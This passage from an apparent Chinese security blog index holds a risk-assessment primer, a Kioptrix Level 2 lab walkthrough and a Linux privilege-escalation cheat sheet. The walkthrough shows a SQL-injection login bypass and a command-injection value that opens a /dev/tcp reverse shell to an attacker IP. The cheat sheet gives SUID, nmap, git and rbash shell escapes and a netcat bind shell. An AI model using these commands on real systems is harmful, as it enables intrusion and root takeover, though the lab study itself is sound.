<h2 id="0x02-基本术语了解"><a href="#0x02-基本术语了解" class="headerlink" title="0x02 基本术语了解"></a><strong><em>0x02 基本术语了解</em></strong></h2><p>​      <strong><em>风评的术语不少，像ARO(年发生率)、SLE（单一损失期望）、EF（暴露因子）之类比较玄的概念， 本次不展开讲。就只讲以下几个本人觉得比较核心的~</em></strong></p>
<p><strong><em>1、资产价值：顾名思义，可以用金额或发生事件会造成的影响来衡量价值。</em></strong></p>
<p><strong><em>2、威胁：特定场景中，可能导致的事件。</em></strong></p>
<p><strong><em>3、脆弱性：漏洞或弱点，即资产或资产组中存在的可被威胁利用的弱点，弱点一旦被利用可能会对资产造成损害。</em></strong></p>
<p><strong><em>4、风险：特定威胁利用资产弱点给资产或资产组带来损害的可能性。(一般风险计算公式 : 资产价值 x 威胁 x 脆弱性  = 风险)</em></strong></p>
<p>​    <strong><em>威胁、脆弱性、风险三者的关系如下图所示：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></em></strong></p>
<h2 id="0x03-风险分析方法"><a href="#0x03-风险分析方法" class="headerlink" title="0x03  风险分析方法"></a><strong><em>0x03  风险分析方法</em></strong></h2><p>​     <strong><em>风险分析具有定量和定性两种方法：</em></strong></p>
<p><strong><em>1、定性分析，更多以观点和场景为基础，使用评级的方式来评定风险的关键级别。</em></strong></p>
<p><strong><em>2、定量分析，会尝试为风险分析过程所有元素都赋值，每个元素（资产价值、威胁评率、脆弱性的严重程度、损失影响、防护成本、防护有效性等）都被量化输入公式，然后计算出总风险和剩余风险。</em></strong> </p>
<p>​      <strong><em>两者特征如下图：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></em></strong></p>
<p>​     <strong><em>简单来说定性比较主观，根据实施人员的经验，判断出风险的高中低（类似于国内的等保测评），但优点在于较容易实施开展；相对的定量分析则由于需要一定的风评辅助工具，且正统的定量分析以发生事件产生的金额损失为结果表现，实施须涉及资产估值（据个人BCS安全大会了解，国内暂无资产估值的标准，正在做），实施难度较大。总的来说两种方法各有优缺点，分别适用于特定的场合。</em></strong></p>
<h2 id="0x04-一般实施思路"><a href="#0x04-一般实施思路" class="headerlink" title="0x04 一般实施思路"></a><strong><em>0x04 一般实施思路</em></strong></h2><p>​    <strong><em>结合个人实际工作经验，大致实施思路分为以下几点：</em></strong></p>
<p><strong><em>1、根据需求选取合适的标准，整理出合适CheckList</em></strong><br><strong><em>2、根据项目大小，选择合适的评估范围</em></strong><br><strong><em>3、收集脆弱点，结合威胁识别/计算出各项风险</em></strong><br><strong><em>4、汇总问题，构思报告表现</em></strong></p>
<h2 id="0x05-一般报告结构"><a href="#0x05-一般报告结构" class="headerlink" title="0x05 一般报告结构"></a><strong><em>0x05 一般报告结构</em></strong></h2><p>​    <strong><em>报告结构这块弹性较大，需结合实际项目，但一般结构包含下图所示几点：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/3.png" class></em></strong></p>
]]></content>
      <categories>
        <category>技战法</category>
      </categories>
  </entry>
  <entry>
    <title>试玩Kioptrix Level 2</title>
    <url>/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/</url>
    <content><![CDATA[<h2 id="0x00相关环境："><a href="#0x00相关环境：" class="headerlink" title="0x00相关环境："></a><strong><em>0x00相关环境：</em></strong></h2><p><strong><em>攻机：Kali</em></strong></p>
<p><strong><em>靶机：Kioptrix Level 2</em></strong></p>
<p><strong><em>下载链接：<a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></em></strong></p>
<h2 id="0x01个人实操："><a href="#0x01个人实操：" class="headerlink" title="0x01个人实操："></a><strong><em>0x01个人实操：</em></strong></h2><p><strong><em>1、探测靶机IP和端口</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/1.png" class></em></p>
<p><strong><em>2、发现80端口，进入web查看</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/2.png" class></em></p>
<p><strong><em>3、尝试弱口令无果，尝试万能密码 ‘or’1’=’1 后进入以下界面：</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/3.png" class></em></p>
<p><strong><em>4、ping界面，发现存在OS命令注入</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/4.png" class></em></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/5.png" class></em></p>
<p><strong><em>5、搭配nc反弹bash获得shell</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.50.188&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/6.png" class></em></p>
<p><strong><em>使用 lsb_release -a  和 uname -mrs 检查系统版本及内核</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/7.png" class></em></p>
<p><strong><em>7、在searchsploit 中发现有匹配的提权 payload</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/8.png" class></em></p>
<p><strong><em>拷贝出脚本，并在kali 使用python -m SimpleHTTPServer 80  开启web服务，靶机在tmp目录wget 获取 9545.c</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/9.png" class></em></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/10.png" class></em></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/11.png" class></em></p>
<p><strong><em>9、最后使用gcc编译、授权后运行脚本，实现提权</em></strong></p>
<p><em><img src="/2020/12/17/%E8%AF%95%E7%8E%A9Kioptrix-Level-2/12.png" class></em></p>
<h2 id="0x02思路整理："><a href="#0x02思路整理：" class="headerlink" title="0x02思路整理："></a><strong><em>0x02思路整理：</em></strong></h2><p><strong><em>发现web后台 ==&gt;万能密码进入 ==&gt;OS注入反弹shell ==&gt;获取内核版本 ==&gt;脚本提权</em></strong></p>
]]></content>
      <categories>
        <category>安全实验</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 提权小结</title>
    <url>/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期对Linux提权颇感兴趣，经拜读相关文章，个人过点实操，权当记录~</em></strong></p>
<h2 id="0x01-SUID提权："><a href="#0x01-SUID提权：" class="headerlink" title="0x01 SUID提权："></a><strong><em>0x01 SUID提权：</em></strong></h2><p><strong><em>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</em></strong></p>
<p><strong><em>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<h3 id="例1、find"><a href="#例1、find" class="headerlink" title="例1、find"></a><strong>例1、find</strong></h3><p><strong><em>假如find命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec whoami \;</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;etc&#x2F;passwd  -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/1.png" class>

<p><strong><em>也有另外一种姿势</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">touch 2333</span><br><span class="line">find 2333 -exec whoami \;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/2.png" class>

<p><strong><em>当然也可以执行反弹shell</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find 2333 -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/3.png" class>

<h3 id="例2、bash"><a href="#例2、bash" class="headerlink" title="例2、bash"></a><strong>例2、bash</strong></h3><p><strong><em>假如bash命令SUID中有”s”权限，就可以直接通过以下命令实现提权操作</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/4.png" class>

<h2 id="0x02-Nmap提权："><a href="#0x02-Nmap提权：" class="headerlink" title="0x02 Nmap提权："></a><strong><em>0x02 Nmap提权：</em></strong></h2><p><strong><em>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/5.png" class>

<h2 id="0x03-Git提权："><a href="#0x03-Git提权：" class="headerlink" title="0x03 Git提权："></a><strong><em>0x03 Git提权：</em></strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">	!&#39;sh&#39;</span><br><span class="line">	或者</span><br><span class="line">sudo git  -p help</span><br><span class="line">	!&#39;sh&#39;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/6.png" class>

<h2 id="0x04-绕过rbash："><a href="#0x04-绕过rbash：" class="headerlink" title="0x04 绕过rbash："></a><strong><em>0x04 绕过rbash：</em></strong></h2><p><strong><em>绕过 rbash , 主要取决于 rbash user 所被允许执行的命令. 通常是利用软件执行外部命令来绕过 rbash. 常见情形的有 vim 、vi、more、less、python 调用 os.system 等. 实际上就是换一个形式调出 bash.</em></strong> </p>
<h3 id="例1、vi、vim、more、less"><a href="#例1、vi、vim、more、less" class="headerlink" title="例1、vi、vim、more、less"></a><strong>例1、vi、vim、more、less</strong></h3><p><strong><em>如下图所示，原本rbash不允许使用cd命令，通过vi命令强行调出bash绕过</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 1 </span><br><span class="line">!&#39;sh&#39;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/7.png" class>

<p><strong><em>vim、less、和more命令也类似，直接发图</em></strong></p>
<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/8.png" class>

<h3 id="例2、python"><a href="#例2、python" class="headerlink" title="例2、python"></a><strong>例2、python</strong></h3><p><strong><em>若有python权限，则可以尝试调用os模块去绕</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/9.png" class>

<h2 id="0x05-内核提权："><a href="#0x05-内核提权：" class="headerlink" title="0x05 内核提权："></a><em>0x05 内核提权：</em></h2><p><strong><em>这块没啥好说的，就是干。。就稍讲笔者所知的两种套路</em></strong></p>
<h3 id="1、针对系统版本"><a href="#1、针对系统版本" class="headerlink" title="1、针对系统版本"></a><strong>1、针对系统版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用lsb_release -a 查看系统版本</span><br><span class="line">2、在kali上使用searchsploit -t 系统版本</span><br><span class="line">3、使用gcc编译后，授权直接跑</span><br></pre></td></tr></table></figure>

<img src="/2020/12/18/Linux-%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/10.png" class>

<h3 id="2、针对内核版本"><a href="#2、针对内核版本" class="headerlink" title="2、针对内核版本"></a><strong>2、针对内核版本</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用Dirty COW漏洞，需要Linux内核&gt;&#x3D;2.6.22，</span><br><span class="line">exp:https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;dirtyc0w.c</span><br><span class="line">比较出名，自行百度</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
  </entry>
</search>
